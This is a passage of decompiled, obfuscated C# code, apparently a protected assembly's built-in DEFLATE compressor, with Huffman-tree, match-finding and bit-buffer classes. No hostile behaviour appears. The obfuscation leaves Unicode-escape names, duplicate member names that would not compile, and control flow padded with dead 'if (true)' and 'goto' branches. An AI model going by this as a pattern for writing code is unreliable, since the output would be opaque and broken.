              (object) index10,
              (object) num8,
              (object) this
            };
            \u0005.\u0002(ex, objArray);
            throw;
          }
        }

        public int \u0002()
        {
          int index;
          int num1;
          try
          {
            int num2 = 0;
label_1:
            if (num2 != 0)
              goto label_8;
            else
              goto label_15;
label_7:
            num2 = index;
label_8:
            int num3 = this.\u0001.Length;
            int num4;
            while (true)
            {
              if (false)
              {
                num2 = num3;
                goto label_1;
              }
              else if (num2 >= num3)
              {
                int num5 = num1;
                int num6 = 0;
                if (num6 != 0)
                {
                  num3 = num6;
                  num2 = num5;
                }
                else
                {
                  if (num6 == 0)
                    return num5;
                  num4 = num5;
                  goto label_6;
                }
              }
              else
              {
                int num7 = num1;
                num3 = (int) this.\u0001[index] * (int) this.\u0001[index];
                num2 = num7;
                break;
              }
            }
            num1 = num2 + num3;
            num4 = index;
label_6:
            index = num4 + 1;
            goto label_7;
label_15:
            num1 = num2;
            index = 0;
            goto label_7;
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> local1 = (ValueType) num1;
            // ISSUE: variable of a boxed type
            __Boxed<int> local2 = (ValueType) index;
            \u0005.\u0002(ex, (object) local1, (object) local2, (object) this);
            throw;
          }
        }

        public void \u0002([In] \u0004.\u0007.\u0001 obj0)
        {
label_0:
          int num1;
          int num2;
          int num3;
          int num4;
          short[] numArray1;
          IntPtr index1;
          int num5;
          int index2;
          try
          {
            num3 = -1;
            index2 = 0;
label_27:
            while (index2 < this.\u0002)
            {
              num5 = 1;
              num4 = (int) this.\u0001[index2];
              while (num4 != 0)
              {
                num1 = 6;
                num2 = 3;
                if (num3 != num4)
                {
                  (numArray1 = obj0.\u0001)[(int) (index1 = (IntPtr) num4)] = (short) ((int) numArray1[index1] + 1);
                  if (true)
                  {
                    if (true)
                    {
                      num5 = 0;
                      goto label_9;
                    }
                    else
                      goto label_0;
                  }
                }
                else
                  goto label_9;
              }
              num1 = 138;
label_4:
              num2 = 3;
label_9:
              num3 = num4;
              ++index2;
label_12:
              int num6 = index2;
              while (true)
              {
                if (true)
                {
                  int num7 = this.\u0002;
                  if (num6 >= num7)
                    goto label_16;
                }
                else
                  goto label_24;
label_15:
                int num8;
                if (num3 == (int) this.\u0001[index2])
                {
                  ++index2;
                  num8 = num5 + 1;
                  if (true)
                  {
                    num5 = num8;
                    if (num8 < num1)
                      goto label_12;
                  }
                  else
                    goto label_22;
                }
label_16:
                int num9 = num5;
                if (false)
                {
                  num6 = num9;
                  continue;
                }
                int num10 = num2;
                if (num9 >= num10)
                {
                  if (num3 == 0)
                  {
                    int num11 = num5;
                    num8 = 10;
                    num8 = num11;
                  }
                  else
                    goto label_20;
                }
                else
                  break;
label_22:
                if (num8 <= num8)
                  num6 = 2;
                else
                  goto label_26;
label_24:
                if (num6 != 0)
                {
                  (numArray1 = obj0.\u0001)[17] = (short) ((int) numArray1[17] + 1);
                  if (false)
                    goto label_15;
                  else
                    goto label_27;
                }
                else
                  goto label_4;
              }
              (numArray1 = obj0.\u0001)[(int) (index1 = (IntPtr) num3)] = (short) ((int) numArray1[index1] + (int) (short) num5);
              continue;
label_20:
              (numArray1 = obj0.\u0001)[16] = (short) ((int) numArray1[16] + 1);
              continue;
label_26:
              (numArray1 = obj0.\u0001)[18] = (short) ((int) numArray1[18] + 1);
            }
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> local1 = (ValueType) num1;
            // ISSUE: variable of a boxed type
            __Boxed<int> local2 = (ValueType) num2;
            // ISSUE: variable of a boxed type
            __Boxed<int> local3 = (ValueType) num5;
            // ISSUE: variable of a boxed type
            __Boxed<int> local4 = (ValueType) num3;
            // ISSUE: variable of a boxed type
            __Boxed<int> local5 = (ValueType) index2;
            // ISSUE: variable of a boxed type
            __Boxed<int> local6 = (ValueType) num4;
            short[] numArray2 = numArray1;
            // ISSUE: variable of a boxed type
            __Boxed<IntPtr> local7 = (ValueType) index1;
            \u0004.\u0007.\u0001 obj = obj0;
            \u0005.\u0002(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) local6, (object) numArray2, (object) local7, (object) this, (object) obj);
            throw;
          }
        }

        public void \u0003([In] \u0004.\u0007.\u0001 obj0)
        {
          int num1;
          int num2;
          int num3;
          int num4;
          int num5;
          int index;
          try
          {
            num3 = -1;
            index = 0;
            while (index < this.\u0002)
            {
              num5 = 1;
              num4 = (int) this.\u0001[index];
              int num6;
              if (num4 == 0)
              {
                if (true)
                  goto label_32;
label_4:
                num6 = 3;
                goto label_5;
label_32:
                num1 = 138;
                goto label_4;
              }
              else
                goto label_7;
label_5:
              int num7;
              int num8;
              if (num6 != 0)
              {
                if (false)
                {
                  num7 = num6;
                  goto label_22;
                }
                else
                {
                  num2 = num6;
                  goto label_10;
                }
              }
              else
              {
                num8 = num6;
                goto label_18;
              }
label_7:
              num1 = 6;
              int num9 = 3;
label_8:
              num2 = num9;
              if (num3 != num4)
              {
                obj0.\u0002(num4);
                num5 = 0;
              }
label_10:
              num3 = num4;
              int num10 = index + 1;
label_11:
              index = num10;
label_16:
              if (index < this.\u0002)
                num8 = num3;
              else
                goto label_19;
label_18:
              int num11 = (int) this.\u0001[index];
              if (num8 == num11)
              {
                num6 = index + 1;
                if (true)
                {
                  index = num6;
                  int num12 = num5;
                  if (false)
                  {
                    num10 = num12;
                    goto label_11;
                  }
                  else if (false)
                  {
                    num9 = num12;
                    goto label_8;
                  }
                  else if ((num5 = num12 + 1) < num1)
                    goto label_16;
                }
                else
                  goto label_5;
              }
label_19:
              if (num5 >= num2)
              {
                if (num3 == 0)
                  goto label_26;
label_25:
                obj0.\u0002(16);
                this.\u0001.\u0001.\u0002(num5 - 3, 2);
                continue;
label_26:
                if (num5 <= 10)
                {
                  obj0.\u0002(17);
                  this.\u0001.\u0001.\u0002(num5 - 3, 3);
                  continue;
                }
                obj0.\u0002(18);
                if (true)
                {
                  this.\u0001.\u0001.\u0002(num5 - 11, 7);
                  continue;
                }
                goto label_25;
              }
label_21:
              num7 = 0;
label_22:
              if (num7 == 0)
              {
                if (num5-- > 0)
                {
                  obj0.\u0002(num3);
                  goto label_21;
                }
              }
              else
                goto label_10;
            }
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> local1 = (ValueType) num1;
            // ISSUE: variable of a boxed type
            __Boxed<int> local2 = (ValueType) num2;
            // ISSUE: variable of a boxed type
            __Boxed<int> local3 = (ValueType) num5;
            // ISSUE: variable of a boxed type
            __Boxed<int> local4 = (ValueType) num3;
            // ISSUE: variable of a boxed type
            __Boxed<int> local5 = (ValueType) index;
            // ISSUE: variable of a boxed type
            __Boxed<int> local6 = (ValueType) num4;
            \u0004.\u0007.\u0001 obj = obj0;
            \u0005.\u0002(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) local6, (object) this, (object) obj);
            throw;
          }
        }
      }
    }

    internal sealed class \u0008
    {
      private int \u0001;
      private short[] \u0001;
      private short[] \u0002;
      private int \u0002;
      private int \u0003;
      private bool \u0001;
      private int \u0004;
      private int \u0005;
      private int \u0006;
      private byte[] \u0001;
      private byte[] \u0002;
      private int \u0007;
      private int \u0008;
      private int \u000E;
      private \u0004.\u000E \u0001;
      private \u0004.\u0007 \u0001;

      public \u0008([In] \u0004.\u000E obj0)
      {
        int num;
        try
        {
          this.\u0001 = obj0;
          this.\u0001 = new \u0004.\u0007(obj0);
          this.\u0001 = new byte[65536];
          this.\u0001 = new short[32768];
          this.\u0002 = new short[32768];
          this.\u0005 = num = 1;
          this.\u0004 = num;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local = (ValueType) num;
          \u0004.\u000E obj = obj0;
          \u0005.\u0002(ex, (object) local, (object) this, (object) obj);
          throw;
        }
      }

      private void \u0002()
      {
        try
        {
          this.\u0001 = (int) this.\u0001[this.\u0005] << 5 ^ (int) this.\u0001[this.\u0005 + 1];
        }
        catch (Exception ex)
        {
          \u0005.\u0002(ex, (object) this);
          throw;
        }
      }

      private int \u0002()
      {
label_0:
        int index;
        short num1;
        try
        {
          int num2 = this.\u0001 << 5;
          int maxValue = (int) this.\u0001[this.\u0005 + 2];
          if (true)
          {
            int num3 = (num2 ^ maxValue) & (int) short.MaxValue;
            if (true)
              index = num3;
            this.\u0002[this.\u0005 & (int) short.MaxValue] = num1 = this.\u0001[index];
            if (true)
            {
              this.\u0001[index] = (short) this.\u0005;
              this.\u0001 = index;
              int num4 = (int) num1;
              maxValue = (int) ushort.MaxValue;
              num2 = num4;
            }
            else
              goto label_0;
          }
          return num2 & maxValue;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<short> local1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) index;
          \u0005.\u0002(ex, (object) local1, (object) local2, (object) this);
          throw;
        }
      }

      private void \u0003()
      {
        int num1;
        int index1;
        int index2;
        int num2;
        try
        {
          Array.Copy((Array) this.\u0001, 32768, (Array) this.\u0001, 0, 32768);
          if (true)
            goto label_14;
label_10:
          this.\u0002[index2] = num2 >= 32768 ? (short) (num2 - 32768) : (short) 0;
          ++index2;
label_11:
          int num3 = index2;
label_12:
          if (num3 >= 32768)
            return;
          num2 = (int) this.\u0002[index2] & (int) ushort.MaxValue;
          goto label_10;
label_14:
          this.\u0002 -= 32768;
          this.\u0005 -= 32768;
          this.\u0004 -= 32768;
          index1 = 0;
          while (index1 < 32768)
          {
            if (true)
            {
              if (true)
              {
                int num4 = (int) this.\u0001[index1] & (int) ushort.MaxValue;
                if (true)
                {
                  num1 = num4;
                }
                else
                {
                  num3 = num4;
                  goto label_12;
                }
              }
              else
                continue;
            }
            this.\u0001[index1] = num1 >= 32768 ? (short) (num1 - 32768) : (short) 0;
            int num5 = index1;
            if (true)
            {
              index1 = num5 + 1;
            }
            else
            {
              num3 = num5;
              goto label_12;
            }
          }
          index2 = 0;
          goto label_11;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) index1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local3 = (ValueType) index2;
          // ISSUE: variable of a boxed type
          __Boxed<int> local4 = (ValueType) num2;
          \u0005.\u0002(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) this);
          throw;
        }
      }

      public void \u0004()
      {
        int length;
        try
        {
          if (this.\u0005 >= 65274)
            goto label_21;
label_14:
          while (true)
          {
            if (this.\u0006 >= 262)
              goto label_17;
label_15:
            int num1 = this.\u0008;
            if (true)
              goto label_16;
label_9:
            int num2 = this.\u0008;
label_10:
            int num3 = num1 - num2;
label_11:
            length = num3;
label_12:
            Array.Copy((Array) this.\u0002, this.\u0008, (Array) this.\u0001, this.\u0005 + this.\u0006, length);
            this.\u0008 += length;
label_13:
            this.\u0007 += length;
            this.\u0006 += length;
            continue;
label_16:
            int num4 = this.\u000E;
            if (num1 < num4)
            {
              int num5;
              for (int index = 0; index == 0; index = num5)
              {
                int num6 = 65536 - this.\u0006;
                int num7 = this.\u0005;
                if (true)
                {
                  int num8 = num6 - num7;
                  if (false)
                  {
                    num3 = num8;
                    goto label_11;
                  }
                  else
                  {
                    length = num8;
                    num5 = length;
                    if (true)
                    {
                      int num9 = this.\u000E - this.\u0008;
                      if (num5 > num9)
                      {
                        num1 = this.\u000E;
                        goto label_9;
                      }
                      else
                        goto label_12;
                    }
                  }
                }
                else
                {
                  num2 = num7;
                  num1 = num6;
                  goto label_10;
                }
              }
              goto label_13;
            }
label_17:
            if (false)
              goto label_15;
            else
              break;
          }
          if (this.\u0006 < 3)
            return;
          this.\u0002();
          return;
label_21:
          this.\u0003();
          goto label_14;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local = (ValueType) length;
          \u0005.\u0002(ex, (object) local, (object) this);
          throw;
        }
      }

      private bool \u0002([In] int obj0)
      {
        int val1;
        int num1;
        int num2;
        int index1;
        byte num3;
        byte num4;
        int num5;
        int num6;
        int index2;
        int num7;
        short[] numArray;
        try
        {
          num5 = 128;
          num6 = 128;
          numArray = this.\u0002;
          index2 = this.\u0005;
          index1 = this.\u0005 + this.\u0003;
          val1 = Math.Max(this.\u0003, 2);
          num1 = Math.Max(this.\u0005 - 32506, 0);
          num2 = this.\u0005 + 258 - 1;
          num3 = this.\u0001[index1 - 1];
          num4 = this.\u0001[index1];
          int num8 = val1;
          if (true)
          {
            if (num8 >= 8)
              num5 >>= 2;
            if (num6 > this.\u0006)
              num6 = this.\u0006;
          }
          else
            goto label_7;
label_5:
          if ((int) this.\u0001[obj0 + val1] == (int) num4 && (int) this.\u0001[obj0 + val1 - 1] == (int) num3 && (int) this.\u0001[obj0] == (int) this.\u0001[index2] && (int) this.\u0001[obj0 + 1] == (int) this.\u0001[index2 + 1])
          {
            num7 = obj0 + 2;
            num8 = index2;
          }
          else
            goto label_13;
label_7:
          index2 = num8 + 2;
          do
            ;
          while ((int) this.\u0001[++index2] == (int) this.\u0001[++num7] && (int) this.\u0001[++index2] == (int) this.\u0001[++num7] && (int) this.\u0001[++index2] == (int) this.\u0001[++num7] && (int) this.\u0001[++index2] == (int) this.\u0001[++num7] && (int) this.\u0001[++index2] == (int) this.\u0001[++num7] && (int) this.\u0001[++index2] == (int) this.\u0001[++num7] && (int) this.\u0001[++index2] == (int) this.\u0001[++num7] && (int) this.\u0001[++index2] == (int) this.\u0001[++num7] && index2 < num2);
          if (index2 > index1)
          {
            this.\u0002 = obj0;
            index1 = index2;
            val1 = index2 - this.\u0005;
            if (val1 < num6)
            {
              num3 = this.\u0001[index1 - 1];
              num4 = this.\u0001[index1];
            }
            else
              goto label_14;
          }
          index2 = this.\u0005;
label_13:
          if ((obj0 = (int) numArray[obj0 & (int) short.MaxValue] & (int) ushort.MaxValue) > num1 && --num5 != 0)
            goto label_5;
label_14:
          this.\u0003 = Math.Min(val1, this.\u0006);
          return this.\u0003 >= 3;
        }
        catch (Exception ex)
        {
          object[] objArray = new object[13]
          {
            (object) num5,
            (object) num6,
            (object) numArray,
            (object) index2,
            (object) num7,
            (object) index1,
            (object) val1,
            (object) num1,
            (object) num2,
            (object) num3,
            (object) num4,
            (object) this,
            (object) obj0
          };
          \u0005.\u0002(ex, objArray);
          throw;
        }
      }

      private bool \u0002([In] bool obj0, [In] bool obj1)
      {
        int num1;
        int num2;
        int num3;
        int num4;
        bool flag;
        try
        {
          if (this.\u0006 < 262 && !obj0)
            return false;
          int num5;
          do
          {
            int num6 = this.\u0006;
            int num7 = 262;
            while (true)
            {
              if (num6 < num7)
                num5 = obj0 ? 1 : 0;
              else
                goto label_40;
label_38:
              if (num5 == 0)
                goto label_39;
label_40:
              if (this.\u0006 != 0)
              {
                num5 = this.\u0005;
                if (true)
                {
                  if (true)
                  {
                    if (num5 >= 65274)
                      this.\u0003();
                    num1 = this.\u0002;
                    int num8;
                    if (true)
                    {
                      num2 = this.\u0003;
                      if (this.\u0006 >= 3)
                      {
                        num3 = this.\u0002();
                        if (num3 != 0 && this.\u0005 - num3 <= 32506 && this.\u0002(num3) && this.\u0003 <= 5)
                        {
                          int num9 = this.\u0003;
                          int num10 = 3;
                          if (num10 != 0)
                          {
                            if (num9 == num10)
                              num8 = this.\u0005;
                            else
                              goto label_16;
                          }
                          else
                          {
                            num7 = num10;
                            num6 = num9;
                            continue;
                          }
                        }
                        else
                          goto label_16;
                      }
                      else
                        goto label_16;
                    }
                    else
                      goto label_20;
label_13:
                    if (num8 - this.\u0002 > 4096)
                    {
                      if (true)
                        this.\u0003 = 2;
                      else
                        goto label_28;
                    }
label_16:
                    int num11 = num2;
                    int num12 = 3;
                    if (num12 != 0)
                    {
                      if (num11 >= num12 && this.\u0003 <= num2)
                      {
                        this.\u0001.\u0002(this.\u0005 - 1 - num1, num2);
                        num2 -= 2;
                      }
                      else
                        goto label_25;
                    }
                    else
                    {
                      num7 = num12;
                      num6 = num11;
                      continue;
                    }
label_19:
                    ++this.\u0005;
label_20:
                    --this.\u0006;
                    if (this.\u0006 >= 3)
                      this.\u0002();
                    num8 = num2 - 1;
                    if (true)
                    {
                      num2 = num8;
                      if (num8 > 0)
                        goto label_19;
                      else
                        break;
                    }
                    else
                      goto label_13;
                  }
                  else
                    goto label_33;
                }
                else
                  goto label_38;
              }
              else
                goto label_41;
            }
            ++this.\u0005;
            --this.\u0006;
            this.\u0001 = false;
            this.\u0003 = 2;
            goto label_28;
label_25:
            if (this.\u0001)
              this.\u0001.\u0002((int) this.\u0001[this.\u0005 - 1] & (int) byte.MaxValue);
            this.\u0001 = true;
            ++this.\u0005;
            --this.\u0006;
label_28:;
          }
          while (!this.\u0001.\u0002());
          int num13 = this.\u0005;
          int num14 = this.\u0004;
          int num15;
          if (true)
          {
            num4 = num13 - num14;
            if (this.\u0001)
              --num4;
            flag = obj1 && this.\u0006 == 0 && !this.\u0001;
            this.\u0001.\u0003(this.\u0001, this.\u0004, num4, flag);
            this.\u0004 += num4;
            num5 = flag ? 1 : 0;
          }
          else
          {
            num15 = num14;
            num5 = num13;
            goto label_34;
          }
label_33:
          num15 = 0;
label_34:
          return num5 == num15;
label_39:
          return true;
label_41:
          if (this.\u0001)
            this.\u0001.\u0002((int) this.\u0001[this.\u0005 - 1] & (int) byte.MaxValue);
          this.\u0001 = false;
          this.\u0001.\u0003(this.\u0001, this.\u0004, this.\u0005 - this.\u0004, obj1);
          this.\u0004 = this.\u0005;
          return false;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> local3 = (ValueType) num3;
          // ISSUE: variable of a boxed type
          __Boxed<int> local4 = (ValueType) num4;
          // ISSUE: variable of a boxed type
          __Boxed<bool> local5 = (ValueType) flag;
          // ISSUE: variable of a boxed type
          __Boxed<bool> local6 = (ValueType) obj0;
          // ISSUE: variable of a boxed type
          __Boxed<bool> local7 = (ValueType) obj1;
          \u0005.\u0002(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) this, (object) local6, (object) local7);
          throw;
        }
      }

      public bool \u0003([In] bool obj0, [In] bool obj1)
      {
label_0:
        bool flag1;
        bool flag2;
        try
        {
          this.\u0004();
          int num1 = obj0 ? 1 : 0;
          if (false)
            goto label_3;
label_2:
          int num2;
          if (num1 == 0)
          {
            num2 = 0;
            goto label_12;
          }
          else
            num1 = this.\u0008 == this.\u000E ? 1 : 0;
label_3:
          if (true)
            num2 = num1;
          else
            goto label_2;
label_12:
          int num3;
          while (true)
          {
            flag2 = num2 != 0;
            if (true)
              goto label_13;
label_6:
            if (this.\u0001.\u0002())
            {
              num3 = flag1 ? 1 : 0;
              if (false)
              {
                num2 = num3;
                continue;
              }
              break;
            }
            goto label_9;
label_13:
            flag1 = this.\u0002(flag2, obj1);
            goto label_6;
          }
          if (num3 != 0)
            goto label_0;
label_9:
          int num4 = flag1 ? 1 : 0;
          if (true)
            return num4 != 0;
          num1 = num4;
          goto label_2;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<bool> local1 = (ValueType) flag1;
          // ISSUE: variable of a boxed type
          __Boxed<bool> local2 = (ValueType) flag2;
          // ISSUE: variable of a boxed type
          __Boxed<bool> local3 = (ValueType) obj0;
          // ISSUE: variable of a boxed type
          __Boxed<bool> local4 = (ValueType) obj1;
          \u0005.\u0002(ex, (object) local1, (object) local2, (object) this, (object) local3, (object) local4);
          throw;
        }
      }

      public void \u0002([In] byte[] obj0)
      {
label_0:
        try
        {
          while (true)
          {
            if (true)
            {
              this.\u0002 = obj0;
              goto label_5;
            }
          }
          goto label_6;
label_5:
          this.\u0008 = 0;
label_6:
          this.\u000E = obj0.Length;
          if (true)
          {
            if (false)
              goto label_5;
          }
          else
            goto label_0;
        }
        catch (Exception ex)
        {
          byte[] numArray = obj0;
          \u0005.\u0002(ex, (object) this, (object) numArray);
          throw;
        }
      }

      public bool \u0002()
      {
        try
        {
          return this.\u000E == this.\u0008;
        }
        catch (Exception ex)
        {
          \u0005.\u0002(ex, (object) this);
          throw;
        }
      }
    }

    internal sealed class \u000E
    {
      protected byte[] \u0001 = new byte[65536];
      private int \u0001 = 0;
      private int \u0002 = 0;
      private uint \u0001 = 0;
      private int \u0003 = 0;

      public void \u0002([In] int obj0)
      {
        int num1;
        try
        {
          byte[] numArray1 = this.\u0001;
          \u0004.\u000E obj1 = this;
          int num2;
          num1 = num2 = obj1.\u0002;
          obj1.\u0002 = num2 + 1;
          int index1 = num1;
          int num3 = (int) (byte) obj0;
          numArray1[index1] = (byte) num3;
          byte[] numArray2 = this.\u0001;
          \u0004.\u000E obj2 = this;
          int num4 = obj2.\u0002;
          if (true)
            goto label_2;
label_1:
          obj2.\u0002 = num4 + 1;
          int index2 = num1;
          int num5 = (int) (byte) (obj0 >> 8);
          numArray2[index2] = (byte) num5;
          return;
label_2:
          num1 = num4;
          goto label_1;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) obj0;
          \u0005.\u0002(ex, (object) local1, (object) this, (object) local2);
          throw;
        }
      }

      public void \u0002([In] byte[] obj0, [In] int obj1, [In] int obj2)
      {
label_0:
        try
        {
          Array.Copy((Array) obj0, obj1, (Array) this.\u0001, this.\u0002, obj2);
label_1:
          if (true)
          {
label_6:
            this.\u0002 += obj2;
            do
            {
              if (true)
              {
                if (false)
                  goto label_1;
              }
              else
                goto label_6;
            }
            while (false);
          }
          else
            goto label_0;
        }
        catch (Exception ex)
        {
          byte[] numArray = obj0;
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) obj1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) obj2;
          \u0005.\u0002(ex, (object) this, (object) numArray, (object) local1, (object) local2);
          throw;
        }
      }

      [SpecialName]
      public int \u0002()
      {
        try
        {
          return this.\u0003;
        }
        catch (Exception ex)
        {
          \u0005.\u0002(ex, (object) this);
          throw;
        }
      }

      public void \u0002()
      {
        int num1;
        try
        {
          if (this.\u0003 > 0)
            goto label_2;
label_1:
          this.\u0001 = 0U;
          this.\u0003 = 0;
          return;
label_2:
          byte[] numArray1 = this.\u0001;
          \u0004.\u000E obj = this;
          int num2;
          num1 = num2 = obj.\u0002;
          obj.\u0002 = num2 + 1;
          int index1 = num1;
          int num3 = (int) (byte) this.\u0001;
          numArray1[index1] = (byte) num3;
          if (this.\u0003 > 8)
          {
            byte[] numArray2 = this.\u0001;
            num1 = this.\u0002++;
            int index2 = num1;
            int num4 = (int) (byte) (this.\u0001 >> 8);
            numArray2[index2] = (byte) num4;
            goto label_1;
          }
          else
            goto label_1;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local = (ValueType) num1;
          \u0005.\u0002(ex, (object) local, (object) this);
          throw;
        }
      }

      public void \u0002([In] int obj0, [In] int obj1)
      {
        int num1;
        try
        {
          if (true)
          {
            if (true)
            {
              this.\u0001 |= (uint) (obj0 << this.\u0003);
              goto label_10;
            }
            else
              goto label_11;
          }
          else
            goto label_5;
label_2:
          if (true)
          {
            byte[] numArray = this.\u0001;
            num1 = this.\u0002++;
            int index = num1;
            int num2 = (int) (byte) (this.\u0001 >> 8);
            numArray[index] = (byte) num2;
          }
          else
            goto label_10;
label_4:
          this.\u0001 >>= 16;
label_5:
          if (true)
          {
            if (true)
            {
              this.\u0003 -= 16;
              return;
            }
            goto label_4;
          }
          else
            goto label_2;
label_10:
          this.\u0003 += obj1;
label_11:
          if (this.\u0003 < 16)
            return;
          byte[] numArray1 = this.\u0001;
          \u0004.\u000E obj = this;
          int num3;
          num1 = num3 = obj.\u0002;
          obj.\u0002 = num3 + 1;
          int index1 = num1;
          int num4 = (int) (byte) this.\u0001;
          numArray1[index1] = (byte) num4;
          goto label_2;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) obj0;
          // ISSUE: variable of a boxed type
          __Boxed<int> local3 = (ValueType) obj1;
          \u0005.\u0002(ex, (object) local1, (object) this, (object) local2, (object) local3);
          throw;
        }
      }

      [SpecialName]
      public bool \u0002()
      {
        try
        {
          return this.\u0002 == 0;
        }
        catch (Exception ex)
        {
          \u0005.\u0002(ex, (object) this);
          throw;
        }
      }

      public int \u0002([In] byte[] obj0, [In] int obj1, [In] int obj2)
      {
label_0:
        int num1;
        try
        {
          int num2 = this.\u0003;
          int num3 = 8;
          int num4;
          int num5;
          int num6;
          while (true)
          {
            if (num2 >= num3)
            {
              byte[] numArray = this.\u0001;
              \u0004.\u000E obj = this;
              int num7 = obj.\u0002;
              if (true)
                goto label_15;
label_2:
              obj.\u0002 = num7 + 1;
              int index = num1;
              int num8 = (int) (byte) this.\u0001;
              numArray[index] = (byte) num8;
              if (true)
              {
                num6 = 0;
                if (num6 == 0)
                {
                  if (num6 == 0)
                  {
                    this.\u0001 >>= 8;
                    this.\u0003 -= 8;
                    goto label_17;
                  }
                  else
                    goto label_13;
                }
                else
                  goto label_20;
              }
              else
                goto label_0;
label_15:
              num1 = num7;
              goto label_2;
            }
label_17:
            num4 = obj2;
            num5 = this.\u0002;
            int num9 = this.\u0001;
            while (true)
            {
              if (true)
              {
                int num10 = num5 - num9;
                if (num4 > num10)
                {
                  int num11 = this.\u0002;
                  int num12 = this.\u0001;
                  num9 = 0;
                  num5 = num12;
                  num4 = num11;
                  break;
                }
                Array.Copy((Array) this.\u0001, this.\u0001, (Array) obj0, obj1, obj2);
                this.\u0001 += obj2;
                goto label_13;
              }
            }
            if (num9 != 0)
            {
              num3 = num5;
              num2 = num4;
            }
            else
              break;
          }
          int num13 = num4 - num5;
label_11:
          obj2 = num13;
          Array.Copy((Array) this.\u0001, this.\u0001, (Array) obj0, obj1, obj2);
          this.\u0001 = 0;
          this.\u0002 = 0;
          goto label_13;
label_20:
          num13 = num6;
          goto label_11;
label_13:
          return obj2;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) num1;
          byte[] numArray = obj0;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) obj1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local3 = (ValueType) obj2;
          \u0005.\u0002(ex, (object) local1, (object) this, (object) numArray, (object) local2, (object) local3);
          throw;
        }
      }

      public \u000E()
      {
        try
        {
        }
        catch (Exception ex)
        {
          \u0005.\u0002(ex, (object) this);
          throw;
        }
      }
    }

    internal sealed class \u000F : MemoryStream
    {
      public void \u0002([In] int obj0)
      {
        try
        {
          this.WriteByte((byte) (obj0 & (int) byte.MaxValue));
          this.WriteByte((byte) (obj0 >> 8 & (int) byte.MaxValue));
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local = (ValueType) obj0;
          \u0005.\u0002(ex, (object) this, (object) local);
          throw;
        }
      }

      public void \u0003([In] int obj0)
      {
        try
        {
          this.\u0002(obj0);
          this.\u0002(obj0 >> 16);
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local = (ValueType) obj0;
          \u0005.\u0002(ex, (object) this, (object) local);
          throw;
        }
      }

      public int \u0002()
      {
        try
        {
          return this.ReadByte() | this.ReadByte() << 8;
        }
        catch (Exception ex)
        {
          \u0005.\u0002(ex, (object) this);
          throw;
        }
      }

      public int \u0003()
      {
        try
        {
          return this.\u0002() | this.\u0002() << 16;
        }
        catch (Exception ex)
        {
          \u0005.\u0002(ex, (object) this);
          throw;
        }
      }

      public \u000F()
      {
        try
        {
        }
        catch (Exception ex)
        {
          \u0005.\u0002(ex, (object) this);
          throw;
        }
      }

      public \u000F([In] byte[] obj0)
        : base(obj0, false)
      {
        try
        {
        }
        catch (Exception ex)
        {
          byte[] numArray = obj0;
          \u0005.\u0002(ex, (object) this, (object) numArray);
          throw;
        }
      }
    }
  }
}
